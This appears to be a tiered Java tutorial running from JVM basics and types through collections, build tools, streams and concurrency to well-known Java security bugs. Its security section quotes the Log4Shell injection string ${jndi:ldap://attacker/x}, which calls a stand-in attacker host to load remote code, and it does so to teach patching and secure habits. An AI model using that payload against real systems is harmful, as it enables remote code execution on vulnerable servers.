01 simple // the idea in plain words

Java compiles your code to bytecode, which runs on the JVM (Java Virtual Machine) on any OS: "write once, run anywhere". It's statically typed: every variable has a type, checked before the program runs.

int holds whole numbers, double decimals, boolean true/false, char one character, and String text. Everything lives inside a class, and the program starts at public static void main(String[] args).

Memory is managed for you: the garbage collector frees objects nothing points to anymore, so Java avoids C's buffer overflows and use-after-free bugs.

How Java runs

You write .java source, the compiler (javac) turns it into bytecode (.class), and the JVM runs that on any operating system. A JDK includes the compiler and tools, a JRE only runs programs. Every program starts at public static void main(String[] args), and every file's public class has the same name as the file.

public class Hello {
    public static void main(String[] args) {
        String name = args.length > 0 ? args[0] : "world";
        System.out.println("hello, " + name);
    }
}

Compile with javac Hello.java, run with java Hello nate. Java is statically typed: every variable has a declared type, and the compiler checks it before the program ever runs.

02 mid // how it's actually used

Types have limits

An int is 32 bits: from -2,147,483,648 to 2,147,483,647. Go past the top and it silently wraps around to negative. No exception, no warning. long is 64 bits; BigDecimal is exact and is what real money code uses.

Exceptions

Errors are objects you throw and catch. Checked exceptions (IOException) must be handled or declared; unchecked ones (NullPointerException, IllegalArgumentException) don't. Never swallow them silently with an empty catch, and never show stack traces to users.

Collections and generics

List<String>, Map<String, Integer>, Set<Long>: the type in angle brackets is checked at compile time.

Types and the things that bite

Primitives (int, long, double, boolean, char, byte) hold values; everything else is an object reference. == on objects compares references, so use .equals() for strings and objects. int overflows silently at about 2.1 billion. null references throw NullPointerException; Optional or explicit checks make the possibility visible.

Control flow and arrays

if/else, for, enhanced for (String s : list), while, switch (and switch expressions in newer versions). Arrays have a fixed size (int[] a = new int[5]) and a.length; ArrayList grows. String.format("%s has %d", name, n) and StringBuilder for building strings in loops.

Build tools and the ecosystem

Maven (pom.xml) and Gradle manage dependencies and builds: mvn package, gradle build. Libraries come from Maven Central, which is why dependency scanning matters. Test with JUnit. Spring Boot is the common web framework.

03 complex // what the pros do

Java's famous security bugs

  • Insecure deserialization: ObjectInputStream.readObject() on untrusted data can run code through "gadget chains" in libraries on the classpath. Use JSON with a schema, or an allowlist filter (ObjectInputFilter)
  • Log4Shell (CVE-2021-44228): Log4j 2 expanded ${jndi:ldap://attacker/x} *inside log messages*, so logging a user's input could load and run remote code. The lesson: dependencies are attack surface; know your SBOM and patch fast
  • SQL injection: use PreparedStatement with ? placeholders
  • XXE: XML parsers that resolve external entities can read local files. Disable DTDs

Integer overflow

Use Math.multiplyExact / Math.addExact (throw on overflow), long or BigDecimal for money, and validate input ranges (a quantity of 21,475 GPUs should be rejected long before math).

Streams and lambdas

List<String> bad = ips.stream()
    .filter(ip -> counts.get(ip) > 10)
    .sorted()
    .toList();

Lambdas are short anonymous functions, streams process collections in a pipeline, and Map.getOrDefault, computeIfAbsent and merge shorten counting code.

Concurrency in short

Threads share memory, so unsynchronized access creates races. Use synchronized, java.util.concurrent classes (ConcurrentHashMap, ExecutorService, AtomicInteger), and prefer immutable objects. Deadlock comes from taking locks in different orders.

Secure Java habits

Parameterized queries with PreparedStatement; never deserialize untrusted data with ObjectInputStream (a classic remote code execution path); use SecureRandom for tokens; keep dependencies patched (Log4Shell showed a single library can expose everything); validate input at the boundary; read secrets from the environment or a vault.
